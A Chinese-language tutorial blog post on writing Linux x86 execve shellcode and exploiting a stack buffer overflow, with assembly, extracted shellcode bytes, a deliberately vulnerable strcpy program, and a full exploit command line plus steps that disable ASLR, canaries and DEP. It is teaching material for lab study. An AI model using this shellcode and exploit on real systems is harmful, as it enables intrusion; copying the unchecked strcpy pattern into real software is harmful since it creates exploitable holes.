@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>Linux 基本缓冲区溢出 shellcode 编写 | Star</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="缓冲区溢出,ROP,CVE," />
+  
+
+  <meta name="description" content="有关shellcode定义不是很了解的请参见 http://huirong.github.io/2016/04/16/shellcodeAndExploit/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux 基本缓冲区溢出 shellcode 编写">
+<meta property="og:url" content="http://huirong.github.io/2016/03/10/Linux-shellcode/index.html">
+<meta property="og:site_name" content="Star">
+<meta property="og:description" content="有关shellcode定义不是很了解的请参见 http://huirong.github.io/2016/04/16/shellcodeAndExploit/">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCjw1f9zy112hgwj30jg0443zh.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/005CA6ZCgw1f9zytwty6yj30k3020gmf.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCgw1f9zywv42rjj30jg09kq5w.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCgw1f9zz9tuh07j30k8069q4o.jpg">
+<meta property="og:updated_time" content="2016-11-21T12:08:14.596Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux 基本缓冲区溢出 shellcode 编写">
+<meta name="twitter:description" content="有关shellcode定义不是很了解的请参见 http://huirong.github.io/2016/04/16/shellcodeAndExploit/">
+<meta name="twitter:image" content="http://ww4.sinaimg.cn/large/005CA6ZCjw1f9zy112hgwj30jg0443zh.jpg">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=028c63b1" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/huirong.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?13fd5daa6d82a4022fb7211641792382";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-shellcode-分析"><span class="toc-text">1 shellcode 分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-execve-系统调用"><span class="toc-text">1.1 execve()系统调用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-分析"><span class="toc-text">1.2 分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-编写-exploit"><span class="toc-text">2 编写 exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-分析"><span class="toc-text">2.1 分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-汇编"><span class="toc-text">2.2 汇编</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-提出二进制码"><span class="toc-text">2.3 提出二进制码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-编写shellcode"><span class="toc-text">3 编写shellcode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-参考文献"><span class="toc-text">4 参考文献</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-Linux-shellcode" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">Linux 基本缓冲区溢出 shellcode 编写</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2016.03.10</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>star</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/exploit-编写/">exploit 编写</a>
+  </span>
+
+
+
+      
+
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>有关shellcode定义不是很了解的请参见 <a href="http://huirong.github.io/2016/04/16/shellcodeAndExploit/">http://huirong.github.io/2016/04/16/shellcodeAndExploit/</a><br><a id="more"></a></p>
+<h1 id="1-shellcode-分析"><a href="#1-shellcode-分析" class="headerlink" title="1 shellcode 分析"></a>1 shellcode 分析</h1><h2 id="1-1-execve-系统调用"><a href="#1-1-execve-系统调用" class="headerlink" title="1.1 execve()系统调用"></a>1.1 execve()系统调用</h2><p>最基本的shellcode就是通过调用 execve() 新开一个shell。<br>C语言程序：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>&#123;</div><div class="line">    <span class="keyword">char</span>* name[<span class="number">2</span>];</div><div class="line">    name[<span class="number">0</span>] = <span class="string">"/bin/sh"</span>;</div><div class="line">    name[<span class="number">1</span>] = <span class="literal">NULL</span>;</div><div class="line">    execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>编译：gcc -o shell shell.c<br>运行：./shell<br><img src="http://ww4.sinaimg.cn/large/005CA6ZCjw1f9zy112hgwj30jg0443zh.jpg" alt=""><br>新打开了一个shell。</p>
+<h2 id="1-2-分析"><a href="#1-2-分析" class="headerlink" title="1.2 分析"></a>1.2 分析</h2><p>execve(name[0], name, NULL);</p>
+<ul>
+<li>name[0]：/bin/sh 的地址</li>
+<li>name：以NULL结束的/bin/sh的地址的地址</li>
+<li>NULL</li>
+</ul>
+<p>Linux 系统调用的参数一般存放在 ebx,ecx,edx,esi,edi 寄存器中。<br>因此参数分布存放情况</p>
+<ul>
+<li>ebx: “/bin/sh” 的地址,且 “/bin/sh” 后跟着 NULL</li>
+<li>ecx: “/bin/sh” 的地址的地址，且 /bin/sh 的地址后跟着NULL</li>
+<li>edx: NULL</li>
+<li>eax: 系统调用号<br>  execve()的系统调用号是 “11” 或 “0xb”</li>
+</ul>
+<h1 id="2-编写-exploit"><a href="#2-编写-exploit" class="headerlink" title="2 编写 exploit"></a>2 编写 exploit</h1><h2 id="2-1-分析"><a href="#2-1-分析" class="headerlink" title="2.1 分析"></a>2.1 分析</h2><p>完成 execve() 系统调用，转化为汇编需要以下几步：</p>
+<ol>
+<li>将以NULL结尾的字符串”/bin//sh” <font color="orange">push</font> 进栈</li>
+<li>在内存中有”/bin//sh”的地址，其后是一个 unsigned long 型的NULL值</li>
+<li>将0xb拷贝到寄存器EAX中(execve的系统调用号是0xb)</li>
+<li>将”/bin//sh”的地址 <font color="orange">mov</font> 到寄存器EBX中</li>
+<li>将”/bin//sh”地址的地址 <font color="orange">mov</font> 到寄存器ECX中</li>
+<li>将 NULL <font color="orange">mov</font> 到寄存器EDX中</li>
+<li>执行中断指令int $0x80</li>
+</ol>
+<font color="red">Tips：需要将 “/bin/sh” 以 4 byte 为单位分割成两部分 “/bin” 、”/sh”，但是 “/sh” 只有 3 byte，最后 1 byte 就会自动填充成 NULL，这是不允许的。因此在最前面增加一个 /，即 “//sh”，最后的字符串为 “/bin//sh”。</font>
+
+<h2 id="2-2-汇编"><a href="#2-2-汇编" class="headerlink" title="2.2 汇编"></a>2.2 汇编</h2><p>对应的汇编程序 shellcode_execve.asm<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">section</span> .text</div><div class="line"><span class="meta">global</span> _start</div><div class="line"><span class="symbol">_start:</span></div><div class="line">    <span class="keyword">xor</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">    <span class="keyword">push</span> <span class="built_in">eax</span>               <span class="comment">;NULL入栈</span></div><div class="line">    <span class="keyword">push</span> <span class="number">0x68732f2f</span>    <span class="comment">;0x68732f2f 即为//sh 的ASCII编码,注意大小端，将//sh入栈</span></div><div class="line">    <span class="keyword">push</span> <span class="number">0x6e69622f</span>    <span class="comment">;0x6e69622f 即为/bin 的ASCII编码，将 /bin 入栈</span></div><div class="line">    <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">esp</span>          <span class="comment">;此时 esp 指向栈顶，即保存 以NULL结尾的"/bin//sh"，将此地址保存到 ebx 中</span></div><div class="line">    <span class="keyword">push</span> <span class="built_in">eax</span>               <span class="comment">; NULL 入栈</span></div><div class="line">    <span class="keyword">push</span> <span class="built_in">ebx</span>               <span class="comment">;以NULL结尾的"/bin//sh" 的地址入栈</span></div><div class="line">    <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">esp</span>          <span class="comment">;"/bin/sh" 的地址的地址放入ecx，且 /bin/sh 的地址后跟着NULL</span></div><div class="line">    <span class="keyword">xor</span> <span class="built_in">edx</span>,<span class="built_in">edx</span>           <span class="comment">; NULL 放置到 edx</span></div><div class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>,<span class="number">0xb</span>            <span class="comment">; execve()系统调用号 11 存放到 eax 中</span></div><div class="line">    <span class="keyword">int</span> <span class="number">0x80</span></div></pre></td></tr></table></figure></p>
+<p>编译：nasm -f elf shellcode_execve.asm -o shellcode_execve.o<br>连接：ld -o shellcode_execve shellcode_execve.o<br>运行：./shellcode_execve </p>
+<p><img src="http://ww2.sinaimg.cn/large/005CA6ZCgw1f9zytwty6yj30k3020gmf.jpg" alt=""></p>
+<h2 id="2-3-提出二进制码"><a href="#2-3-提出二进制码" class="headerlink" title="2.3 提出二进制码"></a>2.3 提出二进制码</h2><p>使用 objdump 提取二进制码：</p>
+<p><img src="http://ww4.sinaimg.cn/large/005CA6ZCgw1f9zywv42rjj30jg09kq5w.jpg" alt=""></p>
+<p>exploit 为<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">"<span class="symbol">\x</span>31<span class="symbol">\x</span>c0<span class="symbol">\x</span>50<span class="symbol">\x</span>68<span class="symbol">\x</span>2f<span class="symbol">\x</span>2f<span class="symbol">\x</span>73<span class="symbol">\x</span>68<span class="symbol">\x</span>68<span class="symbol">\x</span>2f<span class="symbol">\x</span>62<span class="symbol">\x</span>69<span class="symbol">\x</span>6e<span class="symbol">\x</span>89<span class="symbol">\x</span>e3<span class="symbol">\x</span>50<span class="symbol">\x</span>53<span class="symbol">\x</span>89<span class="symbol">\x</span>e1<span class="symbol">\x</span>31<span class="symbol">\x</span>d2<span class="symbol">\x</span>b0<span class="symbol">\x</span>0b<span class="symbol">\x</span>cd<span class="symbol">\x</span>80"</div></pre></td></tr></table></figure></p>
+<h1 id="3-编写shellcode"><a href="#3-编写shellcode" class="headerlink" title="3 编写shellcode"></a>3 编写shellcode</h1><p>有漏洞的程序 level.c<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">function</span><span class="params">(<span class="keyword">char</span>* a)</span></span>&#123;</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</div><div class="line">    <span class="built_in">strcpy</span>(buf,a);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(argc &gt;=<span class="number">2</span> )&#123;</div><div class="line">        function(argv[<span class="number">1</span>]);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,argv[<span class="number">1</span>]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>通过调试找到buf起始地址和返回地址，并计算偏移 offset（此过程过程略去不表）<br>则 shellcode 构造如下： exploit + nop*(offset - strlen(exploit)) + exploit起始地址（即buf起始地址）<br>最终的shellcode如下：<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$(python -c 'print "<span class="symbol">\x</span>31<span class="symbol">\x</span>c0<span class="symbol">\x</span>50<span class="symbol">\x</span>68<span class="symbol">\x</span>2f<span class="symbol">\x</span>2f<span class="symbol">\x</span>73<span class="symbol">\x</span>68<span class="symbol">\x</span>68<span class="symbol">\x</span>2f<span class="symbol">\x</span>62<span class="symbol">\x</span>69<span class="symbol">\x</span>6e<span class="symbol">\x</span>89<span class="symbol">\x</span>e3<span class="symbol">\x</span>50<span class="symbol">\x</span>53<span class="symbol">\x</span>89<span class="symbol">\x</span>e1<span class="symbol">\x</span>31<span class="symbol">\x</span>d2<span class="symbol">\x</span>b0<span class="symbol">\x</span>0b<span class="symbol">\x</span>cd<span class="symbol">\x</span>80"+"A"*115+"<span class="symbol">\x</span>80<span class="symbol">\x</span>ef<span class="symbol">\x</span>ff<span class="symbol">\x</span>bf"')</div></pre></td></tr></table></figure></p>
+<p>关闭地址随机化：echo 0 &gt; /proc/sys/kernel/randomize_va_space<br>编译（关掉canary和DEP）：gcc -o level level.c -fno-stack-protector -z execstack<br>运行:<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./level $(python -c 'print "<span class="symbol">\x</span>31<span class="symbol">\x</span>c0<span class="symbol">\x</span>50<span class="symbol">\x</span>68<span class="symbol">\x</span>2f<span class="symbol">\x</span>2f<span class="symbol">\x</span>73<span class="symbol">\x</span>68<span class="symbol">\x</span>68<span class="symbol">\x</span>2f<span class="symbol">\x</span>62<span class="symbol">\x</span>69<span class="symbol">\x</span>6e<span class="symbol">\x</span>89<span class="symbol">\x</span>e3<span class="symbol">\x</span>50<span class="symbol">\x</span>53<span class="symbol">\x</span>89<span class="symbol">\x</span>e1<span class="symbol">\x</span>31<span class="symbol">\x</span>d2<span class="symbol">\x</span>b0<span class="symbol">\x</span>0b<span class="symbol">\x</span>cd<span class="symbol">\x</span>80"+"A"*115+"<span class="symbol">\x</span>80<span class="symbol">\x</span>ef<span class="symbol">\x</span>ff<span class="symbol">\x</span>bf"')</div></pre></td></tr></table></figure></p>
+<p><img src="http://ww4.sinaimg.cn/large/005CA6ZCgw1f9zz9tuh07j30k8069q4o.jpg" alt=""></p>
+<h1 id="4-参考文献"><a href="#4-参考文献" class="headerlink" title="4 参考文献"></a>4 参考文献</h1><ul>
+<li><a href="http://www.cnblogs.com/Lamboy/archive/2012/07/31/2616103.html" target="_blank" rel="external">linux下shellcode编写入门</a></li>
+<li><a href="http://blog.dutsec.cn/index.php/archives/7/" target="_blank" rel="external">Linux下本地exploit编写shellcode之一缓冲区溢出|转</a></li>
+<li><a href="http://fcinbj.blog.51cto.com/911909/473992" target="_blank" rel="external">如何编写并编译一个shellcode(linux)</a></li>
+</ul>
+
+    
+  </div>
+</article>
+
+</div>
+
+
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">走过的，路过的，请支持一下我 n(*≧▽≦*)n</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+  <section class="duoshuo-comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="http://huirong.github.io/2016/03/10/Linux-shellcode/index.html" data-title="Linux 基本缓冲区溢出 shellcode 编写" data-url="http://huirong.github.io/2016/03/10/Linux-shellcode/index.html"></div>
+    <!-- 多说评论框 end -->
+  </section>
+
+
+
+
+  <script type="text/javascript">
+  var duoshuoQuery = {short_name:"star"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+     || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+  </script>
+
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
